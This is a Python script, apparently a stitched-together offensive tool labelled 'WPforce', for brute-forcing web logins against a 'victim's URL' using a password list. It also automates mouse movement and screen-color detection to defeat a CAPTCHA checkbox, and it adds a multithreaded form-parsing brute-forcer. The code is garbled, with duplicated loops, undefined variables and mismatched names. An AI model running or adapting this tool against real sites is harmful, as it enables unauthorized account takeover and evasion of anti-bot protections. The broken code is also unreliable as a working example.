import os
import sys
import time
import argparse
import pyautogui
from random import randint
import pyscreenshot as ImageGrab
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import requests
import urllib
import urllib3
from urllib.request import urlopen, Request 
from http.cookiejar import CookieJar
import threading
from queue import Queue
from html.parser import HTMLParser

# Banner
print("========================================")
print("             WPforce - by Glitch422")
print("========================================")


url = input("Please enter the victim's URL:\t")
username = input("Please enter the username:\t")
password = input("Please enter the password list (name of the file or path):\t")

with open(password, 'r') as passlist:
    for p in passlist:
        p = p.strip()
        data_payload = {
            'username': username,
            'password': p,
            'RememberMe': 'false'
        }
        site = requests.post(f'{url}', data=data_payload)
        text = site.text
        if "The email or password provided is incorrect" in text:
            print(f'Login failed: {username} {p}')
        else:
            print(f'Login successful: {username} {p}')
            break

min_diff = 3
min_offset = 200
w, h = pyautogui.size()

def finish():
    sys.exit()

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, action='store', help='Option')
    my_args = parser.parse_args()
    return my_args

def move(obj_x, obj_y, t, mov_val, delay):
    time.sleep(delay)
    init_t = t
    init_mov_val = mov_val

    while True:
        current_x, current_y = pyautogui.position()
        mov_val = int(mov_val)

        if abs(current_x - obj_x) < min_diff:
            randx = 0
        else:
            if current_x < obj_x:
                randx = abs(randint(0, mov_val))
            else:
                randx = -1 * abs(randint(0, mov_val))

        if abs(current_y - obj_y) < min_diff:
            randy = 0
            if randx == 0:
                break
        else:
            if current_y < obj_y:
                randy = abs(randint(0, mov_val))
            else:
                randy = -1 * abs(randint(0, mov_val))

        pyautogui.moveRel(randx, randy, t)

        if t > 0.001:
            t *= 0.97
            mov_val *= 0.97
        else:
            t = init_t
            mov_val = init_mov_val
            break

def checkGreen():
    image = ImageGrab.grab()
    verde = (0, 158, 85)
    w, h = pyautogui.size()
    count = 0

    for y in range(0, h - 1):
        for x in range(0, w - 1):
            color = image.getpixel((x, y))
            if color == verde:
                count += 1

    return count > 50

def colorLocate():
    image = ImageGrab.grab()
    w, h = pyautogui.size()
    offset = 100
    y = offset
    coordinates_x = []
    coordinates_y = []

    while y < (h - offset):
        y += 1
        line_colors = []
        for x in range(0, w - 1):
            color = image.getpixel((x, y))
            line_colors.append(color)

        srch_clr_1 = (155, 155, 155)
        srch_clr_2 = (167, 195, 231)

        if srch_clr_1 in line_colors and srch_clr_2 in line_colors:
            for x in range(0, w - 1):
                color = image.getpixel((x, y))
                if color == srch_clr_2:
                    if x not in coordinates_x:
                        coordinates_x.append(x)
                    if y not in coordinates_y:
                        coordinates_y.append(y)

    coordx = int(sum(coordinates_x) / len(coordinates_x))
    coordy = int(sum(coordinates_y) / len(coordinates_y))
    return coordx, coordy

def openchrome(url):
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--incognito")
    options.add_argument("--disable-infobars")
    driver = webdriver.Chrome('C:/chromedriver.exe', options=options)
    if url is not None:
        driver.get(url)
    return driver

def randomMovement(n):
    for i in range(0, n):
        move(randint(min_offset, w - min_offset), randint(min_offset, h - min_offset), 0.05, 50, 0)

def prepareElements(n):
    texts = []
    positions = []

    for it in range(1, int(n) + 1):
        text = input("Text for element " + str(it) + ": ")
        texts.append(text)

    for it in range(1, int(n) + 1):
        input("Put cursor over element " + str(it) + " and press Enter")
        positions.append(pyautogui.position())

    return texts, positions

def main():
    args = get_args()
    url = args.url

    driver = openchrome(url)
    number_inputs_pre = input("Number of elements before captcha: ")
    pre_texts, pre_positions = prepareElements(number_inputs_pre)
    number_inputs_post = input("Number of elements after captcha: ")
    post_texts, post_positions = prepareElements(number_inputs_post)
    driver.close()

    done = False

    while not done:
        print("Initializing...")

        randomMovement(1)

        driver = openchrome(url)
        time.sleep(2)

        for ind in range(0, len(pre_positions)):
            pos = pre_positions[ind]
            txt = pre_texts[ind]
            move(pos[0], pos[1], 0.1, 30, 0)
            pyautogui.click()
            pyautogui.typewrite(txt)
            time.sleep(1)

        coords = colorLocate()
        while abs(pyautogui.position()[0] - coords[0]) > 100 or abs(pyautogui.position()[1] - coords[1]) > 100:
            move(coords[0], coords[1], 0.1, 30, 0)
        pyautogui.click()
        time.sleep(2)
        done = checkGreen()

        randomMovement(1)

        for ind in range(0, len(post_positions)):
            pos = post_positions[ind]
            txt = post_texts[ind]
            pyautogui.moveTo(pos[0], pos[1])
            pyautogui.click()
            pyautogui.typewrite(txt)
            time.sleep(1)

        time.sleep(5)
        if driver.current_url != url:
            print("SUCCESS")
            finish()
        driver.close()

if __name__ == "__main__":
    # Add the code for brute forcing here
    target_url = input("Please enter the victim's URL:\t")
    username = input("Please enter the username:\t")

    password_path = input("Please enter the path to the password list file:\t")

    sucess_check = "Dashboard"

    # Open the password file
    with open(password_path, 'r') as passlist:
        for p in passlist:
            p = p.strip()
            data_payload = {
                'username': username,
                'password': p,
                'RememberMe': 'false'
            }
            site = requests.post(f'{url}', data=data_payload)
            text = site.text
            if "The email or password provided is incorrect" in text:
                print(f'Login failed: {username} {p}')
            else:
                print(f'Login successful: {username} {p}')
                break

    # Continue with the rest of the code
    class Bruter(object):
        def __init__(self, username, words):
            self.username = username
            self.password_q = words
            self.found = False

            print("Finished setting up for: %s" % username)

        def run_bruteforce(self):
            for i in range(user_thread):
                t = threading.Thread(target=self.web_bruter)
                t.start()

        def web_bruter(self):
            while not self.password_q.empty() and not self.found:
                brute = self.password_q.get().rstrip()
                jar = CookieJar()
                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

                response = opener.open(target_url)

                page = response.read()

                print("Trying: %s: %s (%d left)" % (self.username, brute, self.password_q.qsize()))

                # parse out the hidden fields
                parser = BruteParser()
                parser.feed(page)

                post_tags = parser.tag_results

                # add our username and password fields
                post_tags[username_field] = self.username
                post_tags[password_fields] = brute

                login_data = urllib.parse.urlencode(post_tags)
                login_response = opener.open(target_post, login_data.encode())

                login_result = login_response.read()

                if sucess_check.encode() in login_result:
                    self.found = True
                    print("[*] Bruteforce successful.")
                    print("[*] Username: %s" % username)
                    print("[*] Password: %s" % brute)
                    print("[*] Waiting for other threads to exit....")

    class BruteParser(HTMLParser):
        def __init__(self):
            HTMLParser.__init__(self)
            self.tag_results = {}

        def handle_starttag(self, tag, attrs):
            if tag == "input":
                tag_name = None
                tag_value = None
                for name, value in attrs:
                    if name == "name":
                        tag_name = value
                    if name == "value":
                        tag_value = value

                if tag_name is not None:
                    self.tag_results[tag_name] = tag_value

    # Add the code for initializing brute forcing
    brute = Bruter(username, password_queue)
    brute.run_bruteforce()

    # Print a message when the bruteforce process is finished
    print("Bruteforce process completed.")

    main()
